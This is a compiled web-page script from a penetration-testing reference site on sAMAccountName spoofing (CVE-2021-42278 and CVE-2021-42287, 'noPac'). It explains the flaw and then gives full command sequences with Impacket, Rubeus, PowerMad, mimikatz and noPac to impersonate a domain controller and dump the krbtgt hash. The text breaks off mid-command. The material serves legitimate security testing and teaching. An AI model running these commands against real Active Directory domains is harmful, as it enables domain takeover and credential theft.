import{_ as o,c as k,a5 as h,G as e,w as t,B as n,o as c,j as i,a as s}from"./chunks/framework.B5CpDqM0.js";const p="/assets/sAMAccountName%20spoofing%20example.CjQK1mT_.png",b=JSON.parse('{"title":"sAMAccountName spoofing","description":"CVE-2021-42278 and CVE-2021-42287","frontmatter":{"description":"CVE-2021-42278 and CVE-2021-42287","authors":"ShutdownRepo, lap1nou"},"headers":[],"relativePath":"ad/movement/kerberos/samaccountname-spoofing.md","filePath":"ad/movement/kerberos/samaccountname-spoofing.md","lastUpdated":1724982529000}'),d={name:"ad/movement/kerberos/samaccountname-spoofing.md"};function g(m,a,u,E,F,y){const l=n("PluginTabsTab"),r=n("PluginTabs");return c(),k("div",null,[a[2]||(a[2]=h('<h1 id="samaccountname-spoofing" tabindex="-1">sAMAccountName spoofing <a class="header-anchor" href="#samaccountname-spoofing" aria-label="Permalink to &quot;sAMAccountName spoofing&quot;">â€‹</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">â€‹</a></h2><p>In November 2021, two vulnerabilities caught the attention of many security researchers as they could allow domain escalation from a standard user.</p><h3 id="cve-2021-42278-name-impersonation" tabindex="-1">CVE-2021-42278 - Name impersonation <a class="header-anchor" href="#cve-2021-42278-name-impersonation" aria-label="Permalink to &quot;CVE-2021-42278 - Name impersonation&quot;">â€‹</a></h3><p>Computer accounts should have a trailing <code>$</code> in their name (i.e. <code>sAMAccountName</code> attribute) but no validation process existed to make sure of it. Abused in combination with CVE-2021-42287, it allowed attackers to impersonate domain controller accounts.</p><h3 id="cve-2021-42287-kdc-bamboozling" tabindex="-1">CVE-2021-42287 - KDC bamboozling <a class="header-anchor" href="#cve-2021-42287-kdc-bamboozling" aria-label="Permalink to &quot;CVE-2021-42287 - KDC bamboozling&quot;">â€‹</a></h3><p>When requesting a Service Ticket, presenting a TGT is required first. When the service ticket is asked for is not found by the KDC, the KDC automatically searches again with a trailing <code>$</code>. What happens is that if a TGT is obtained for <code>bob</code>, and the <code>bob</code> user gets removed, using that TGT to request a service ticket for another user to himself (S4U2self) will result in the KDC looking for <code>bob$</code> in AD. If the domain controller account <code>bob$</code> exists, then <code>bob</code> (the user) just obtained a service ticket for <code>bob$</code> (the domain controller account) as any other user ðŸ¤¯.</p><div class="tip custom-block"><p></p><blockquote><p>S4U2Self works for a user marked as sensitive for delegation and a member of the Protected Users group.</p><p><em>(Elad Shamir in his article <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#solving-a-sensitive-problem" target="_blank" rel="noreferrer">Wagging the Dog</a>)</em></p></blockquote></div><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">â€‹</a></h2><h3 id="machine-account" tabindex="-1">Machine Account <a class="header-anchor" href="#machine-account" aria-label="Permalink to &quot;Machine Account&quot;">â€‹</a></h3><p>The ability to edit a machine account&#39;s <code>sAMAccountName</code> and <code>servicePrincipalName</code> attributes is a requirement to the attack chain. The easiest way this can be achieved is by creating a computer account (e.g. by leveraging the <a href="./../builtins/machineaccountquota">MachineAccountQuota</a> domain-level attribute if it&#39;s greater than 0). The creator of the new machine account has enough privileges to edit its attributes. Alternatively, taking control over the owner/creator of a computer account should do the job.</p><p>The attack can then be conducted as follows.</p><ol><li>Clear the controlled machine account <code>servicePrincipalName</code> attribute of any value that points to its name (e.g. <code>host/machine.domain.local</code>, <code>RestrictedKrbHost/machine.domain.local</code>)</li><li>Change the controlled machine account <code>sAMAccountName</code> to a Domain Controller&#39;s name without the trailing <code>$</code> -&gt; <a href="./samaccountname-spoofing#cve-2021-42278-name-impersonation">CVE-2021-42278</a></li><li>Request a TGT for the controlled machine account</li><li>Reset the controlled machine account <code>sAMAccountName</code> to its old value (or anything else different than the Domain Controller&#39;s name without the trailing <code>$</code>)</li><li>Request a service ticket with S4U2self by presenting the TGT obtained before -&gt; <a href="./samaccountname-spoofing#cve-2021-42287-kdc-lookup">CVE-2021-42287</a></li><li>Get access to the domain controller (i.e. <a href="./../credentials/dumping/dcsync">DCSync</a>)</li></ol><div class="note custom-block"><p>At the time of writing this recipe, some of the tools and features that allow exploitation of these vulnerabilities are still in development</p><ul><li>Impacket&#39;s getST: <a href="https://github.com/SecureAuthCorp/impacket/pull/1202" target="_blank" rel="noreferrer">https://github.com/SecureAuthCorp/impacket/pull/1202</a></li><li>Impacket&#39;s renameMachine: <a href="https://github.com/SecureAuthCorp/impacket/pull/1224" target="_blank" rel="noreferrer">https://github.com/SecureAuthCorp/impacket/pull/1224</a></li></ul></div>',14)),e(r,null,{default:t(()=>[e(l,{label:"UNIX-like"},{default:t(()=>a[0]||(a[0]=[i("p",null,"On UNIX-like systems, the steps mentioned above can be conducted with",-1),i("ul",null,[i("li",null,[i("a",{href:"https://github.com/dirkjanm/krbrelayx",target:"_blank",rel:"noreferrer"},"krbelayx"),s("'s (Python) addspn script for the manipulation of the computer's SPNs")]),i("li",null,[i("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),s("'s (Python) scripts (addcomputer, renameMachine, getTGT, getST, secretsdump) for all the other operations")])],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 0. create a computer account")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"addcomputer.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -computer-name"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ControlledComputer$'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -computer-pass"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ComputerPassword'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-host"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," DC01"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain-netbios"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," domain"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain.local/user1:complexpassword'")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 1. clear its SPNs")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"addspn.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --clear"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -t"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ControlledComputer$'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain\\user'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'password'"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DomainController.domain.local'")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 2. rename the computer (computer -> DC)")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"renameMachine.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -current-name"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ControlledComputer$'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -new-name"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DomainController'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DomainController.domain.local'"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain.local'/'user':'password'")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 3. obtain a TGT")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"getTGT.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DomainController.domain.local'"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain.local'/'DomainController':'ComputerPassword'")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 4. reset the computer name")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"renameMachine.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -current-name"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DomainController'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -new-name"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ControlledComputer$'"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain.local'/'user':'password'")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 5. obtain a service ticket with S4U2self by presenting the previous TGT")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"KRB5CCNAME"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'DomainController.ccache'"),i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," getST.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -self"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -impersonate"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DomainAdmin'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -altservice"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'cifs/DomainController.domain.local'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -k"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -no-pass"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DomainController.domain.local'"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain.local'/'DomainController'")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 6. DCSync by presenting the service ticket")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"KRB5CCNAME"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'DomainAdmin.ccache'"),i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," secretsdump.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -just-dc-user"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'krbtgt'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -k"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -no-pass"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DomainController.domain.local'"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," @'DomainController.domain.local'")])])])],-1),i("p",null,[i("a",{href:"https://github.com/Ridter/noPac",target:"_blank",rel:"noreferrer"},"noPac.py"),s(" (Python) is an automated alternative that can be used to scan and abuse unpatched targets from a UNIX-like environnment.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"scanner.py"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USERNAME"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},":"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-dc-ip"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DC_IP")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"noPac.py"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USERNAME"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},":"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-dc-ip"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DC_IP "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--impersonate"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," Administrator"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dump")])])])],-1),i("div",{class:"tip custom-block"},[i("p",null,[s("When using "),i("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),s(`'s addcomputer script for the creation of a computer account, the "SAMR" method is used by default (instead of the LDAPS one). At the time of writing (10th of December, 2021), the SAMR method creates the account without SPNs, which allows to skip step #1.`)])],-1)])),_:1}),e(l,{label:"Windows"},{default:t(()=>a[1]||(a[1]=[i("p",null,"On Windows systems, the steps mentioned above can be conducted with",-1),i("ul",null,[i("li",null,[i("a",{href:"https://github.com/Kevin-Robertson/Powermad/",target:"_blank",rel:"noreferrer"},"PowerMad"),s("'s (PowerShell) "),i("code",null,"New-MachineAccount"),s(" and "),i("code",null,"Set-MachineAccountAttribute"),s(" functions for the creation and manipulation of a computer account")]),i("li",null,[s("with "),i("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"Rubeus"),s(" (C#) for the requests of Kerberos TGT and Service Ticket")]),i("li",null,[s("with "),i("a",{href:"https://github.com/gentilkiwi/mimikatz",target:"_blank",rel:"noreferrer"},"Mimikatz"),s(" (C) for the "),i("a",{href:"./../credentials/dumping/dcsync"},"DCSync"),s(" operation with "),i("a",{href:"https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync",target:"_blank",rel:"noreferrer"},[i("code",null,"lsadump::dcsync")])])],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 0. create a computer account")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$password "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," ConvertTo-SecureString"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ComputerPassword'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"AsPlainText "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Force")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"New-MachineAccount"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"MachineAccount "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"ControlledComputer"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Password "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"$"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"($password) "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Domain "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"domain.local"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"DomainController "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"DomainController.domain.local"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Verbose")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 1. clear its SPNs")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Set-DomainObject"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Identity "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'ControlledComputer$'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Clear "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'serviceprincipalname'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Verbose")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 2. rename the computer (computer -> DC)")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Set-MachineAccountAttribute"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"MachineAccount "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"ControlledComputer"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Value "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"DomainController"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Attribute samaccountname "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Verbose")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 3. obtain a TGT")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," asktgt "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"DomainController"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"password:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"ComputerPassword"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"domain.local"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"dc:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"DomainController.domain.local"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"nowrap")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 4. reset the computer name")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Set-MachineAccountAttribute"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"MachineAccount "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"ControlledComputer"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Value "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"ControlledComputer"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Attribute samaccountname "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Verbose")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 5. obtain a service ticket with S4U2self by presenting the previous TGT")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," s4u "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"self "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"impersonateuser:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"DomainAdmin"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"altservice:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"ldap/DomainController.domain.local"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"dc:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"DomainController.domain.local"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ptt "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ticket:["),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"Base64"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," TGT"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"]")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 6. DCSync")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"(mimikatz) lsadump::dcsync "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:domain.local "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"kdc:DomainController.domain.local "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user:krbtgt")])])])],-1),i("p",null,[i("a",{href:"https://github.com/cube0x0/noPac",target:"_blank",rel:"noreferrer"},"noPac"),s(" (C#) is an automated alternative that can be used to scan and abuse unpatched targets.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"noPac.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," scan "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain domain.local "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"lowpriv"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"pass "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"lowpriv"')]),s(`
